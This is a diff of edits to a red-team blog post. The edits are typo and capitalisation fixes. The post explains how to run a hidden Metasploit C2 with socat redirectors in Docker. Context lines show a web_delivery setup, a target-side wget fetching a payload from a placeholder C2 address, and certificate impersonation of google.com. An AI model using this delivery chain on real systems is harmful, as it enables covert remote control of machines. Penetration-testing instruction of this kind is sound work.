@@ -6,7 +6,7 @@
     
     <meta http-equiv="content-type" content="text/html; charset=utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
-<meta name="description" content="Abstract Setup 🔧  Docker Socat Metasploit   Running the delivery chain 💥 Delivering and communicating with https 🔒 Notes  Abstract We want to run a simple C2 that is not exposed to the internet, with multiple socats redirecting our payload delivery and session handling correctly. All this with the help of docker.
+<meta name="description" content="Abstract Setup 🔧  Docker Socat Metasploit   Running the delivery chain 💥 Delivering and communicating with https 🔒 Notes  Abstract We want to run a simple C2 that is not exposed to the internet, with multiple socats redirecting our payload delivery and session handling correctly. All this with the help of Docker.
 It&amp;rsquo;s straightforward once you&amp;rsquo;ve gotten the grip.
 Why
 Using containers means we get the &amp;ldquo;it always works&amp;rdquo; factor, compared to manual installs."/>
@@ -158,11 +158,11 @@ Using containers means we get the &amp;ldquo;it always works&amp;rdquo; factor, 
 <li><a href="#notes">Notes</a></li>
 </ul>
 <h2 id="abstract">Abstract</h2>
-<p>We want to run a simple C2 that is not exposed to the internet, with multiple socats redirecting our <strong>payload delivery</strong> and <strong>session handling</strong> correctly. All this with the help of docker.<br>
+<p>We want to run a simple C2 that is not exposed to the internet, with multiple socats redirecting our <strong>payload delivery</strong> and <strong>session handling</strong> correctly. All this with the help of Docker.<br>
 It&rsquo;s straightforward once you&rsquo;ve gotten the grip.</p>
 <p><strong>Why</strong></p>
-<p>Using containers means we get the &ldquo;it always works&rdquo; factor, compared to manual installs. Since each docker image is already built, we can just pull it and have everything working out of the box.<br>
-Docker greatly facilites abstraction of networking and volumes, and makes for easy repeatable deployments.</p>
+<p>Using containers means we get the &ldquo;it always works&rdquo; factor, compared to manual installs. Since each Docker image is already built, we can just pull it and have everything working out of the box.<br>
+Docker greatly facilitates abstraction of networking and volumes, and makes for easy repeatable deployments.</p>
 <p>To quote a seasoned professional:</p>
 <blockquote class="twitter-tweet"><p lang="en" dir="ltr">Peeps if you’re not using Docker during your tests you’re missing out. Not having to deal with VMs/tool install woes speeds everything up. There is an adjustment period, change is hard but in the end it will speed up your workflow significantly.</p>&mdash; Marcello (@byt3bl33d3r) <a href="https://twitter.com/byt3bl33d3r/status/1225924500849475584?ref_src=twsrc%5Etfw">February 7, 2020</a></blockquote>
 <script async src="https://platform.twitter.com/widgets.js" charset="utf-8"></script>
@@ -194,10 +194,11 @@ Docker greatly facilites abstraction of networking and volumes, and makes for ea
 <p>For our C2, we&rsquo;re going to use Metasploit with the reverse_http meterpreter.</p>
 <p>⭐ <strong>These instructions also work with the <code>meterpreter_reverse_https</code> and <code>meterpreter_reverse_tcp</code> payloads as is.</strong></p>
 <p>We&rsquo;re using the http variant so as to see all the traffic in cleartext at each step for live fiddling. Prefer encrypted channels when performing exercises.</p>
-<p>In our case, the payload is served on port 443, but using http. You can add an SSL certificat, explained later <a href="#delivering-and-communicating-with-https-">here</a>.</p>
+<p>In our case, the payload is served on port 443, but using http. You can add an SSL certificate, explained later <a href="#delivering-and-communicating-with-https-">here</a>.</p>
 <h2 id="setup-">Setup 🔧</h2>
 <h3 id="docker">Docker</h3>
-<p>This post won&rsquo;t introduce docker as there is plenty of excellent write-ups. For this post, you need to have a grasp on docker networks, volumes, and to be able to run the <code>hello-world</code> container.</p>
+<p>This post won&rsquo;t introduce Docker as there are plenty of excellent write-ups. For this post, you need to have a grasp on Docker networks and volumes.</p>
+<p>Try running the <code>hello-world</code> container to check:</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-docker" data-lang="docker">$ docker run hello-world <span style="color:#75715e"># Hello from docker</span><span style="color:#960050;background-color:#1e0010">
 </span></code></pre></div><p>Let&rsquo;s create our isolated network first:</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-docker" data-lang="docker">$ docker network create c2-net<span style="color:#960050;background-color:#1e0010">
@@ -213,12 +214,12 @@ We&rsquo;re going to launch our two socat containers as daemons.</p>
 <p>To view the logs, you can either:</p>
 <ul>
 <li>Run <code>docker logs CONTAINER</code> where container could be <code>socat_delivery</code></li>
-<li>Instead of starting the container as a daemon with <code>-d</code>, replace the option with <code>-it</code> to receive output in the forground. You&rsquo;ll need new seperate terminals to run both socats.</li>
+<li>Instead of starting the container as a daemon with <code>-d</code>, replace the option with <code>-it</code> to receive output in the foreground. You&rsquo;ll need new separate terminals to run both socats.</li>
 </ul>
 <h3 id="metasploit">Metasploit</h3>
 <p>In this post, I&rsquo;ll be running the meterpeter_reverse_http on a Linux x64 target.<br>
 If you wish to target something else (Windows, OSX), use <code>show targets</code> and <code>show payloads</code> and set the <code>TARGET</code> and <code>PAYLOAD</code> options accordingly.<br>
-You may also start <code>./msfconsole</code> without any resource file and configure it manualy.</p>
+You may also start <code>./msfconsole</code> without any resource file and configure it manually.</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">$ mkdir socat-msf
 $ cd socat-msf
 $ nano docker_delivery.rc
@@ -300,7 +301,7 @@ wget <span style="color:#f92672">-</span>qO <span style="color:#ae81ff">0976</sp
 <pre><code>msf exploit(multi/script/web_delivery) &gt; set SSL true
 </code></pre><p>And run.</p>
 <p>On the target simply use <code>https://YOUR-C2-EXT-IP/delivery</code> as the wget URL instead of the generated one.</p>
-<p>If you want to impersonate a certificate, use the dedicated auxillary module:</p>
+<p>If you want to impersonate a certificate, use the dedicated auxiliary module:</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript"><span style="color:#a6e22e">msf</span> <span style="color:#f92672">&gt;</span> <span style="color:#a6e22e">use</span> <span style="color:#a6e22e">auxiliary</span><span style="color:#f92672">/</span><span style="color:#a6e22e">gather</span><span style="color:#f92672">/</span><span style="color:#a6e22e">impersonate_ssl</span>
 <span style="color:#a6e22e">msf</span> <span style="color:#a6e22e">auxiliary</span>(<span style="color:#a6e22e">impersonate_ssl</span>) <span style="color:#f92672">&gt;</span> <span style="color:#a6e22e">set</span> <span style="color:#a6e22e">RHOST</span> <span style="color:#a6e22e">www</span>.<span style="color:#a6e22e">google</span>.<span style="color:#a6e22e">com</span>
 <span style="color:#a6e22e">RHOST</span> =&gt; <span style="color:#a6e22e">www</span>.<span style="color:#a6e22e">google</span>.<span style="color:#a6e22e">com</span>
@@ -338,16 +339,16 @@ msf exploit(multi/script/web_delivery) &gt; set stagerverifysslcert true
 </ul>
 <pre><code>$ docker run -it alpine sh
 </code></pre><ul>
-<li>The Metasploit container is by <a href="https://hub.docker.com/r/phocean/msf/">phocean</a> and includes an initialised PostgresDB. You can check it is running correctly with:</li>
+<li>The Metasploit container is by <a href="https://hub.docker.com/r/phocean/msf/">phocean</a> and includes an initialised PostgresDB. You can check that it is running correctly with:</li>
 </ul>
 <pre><code>msf &gt; db_status
 [*] postgresql connected to msfdb
 </code></pre><ul>
-<li>You can add already existing containers to a new network using</li>
+<li>You can add already existing containers to a new network using:</li>
 </ul>
 <pre><code>$ docker network connect c2-net new-msf
 </code></pre><hr>
-<p>💭 <em>I&rsquo;ll hopefully be posting more about using docker-based red team infrastructures, as there is still plenty of things to talk about. Also, if you spot a mistake, feel free to let me know.</em><br>
+<p>💭 <em>I&rsquo;ll hopefully be posting more on docker-based red team infrastructure, as there are still plenty of things to talk about. Also, if you spot a mistake, feel free to let me know.</em><br>
 <em>Follow me on <a href="https://twitter.com/kh4st3x">Twitter</a> if you wish to stay updated!</em></p>
 <p>Thank you for reading 💜</p>
 
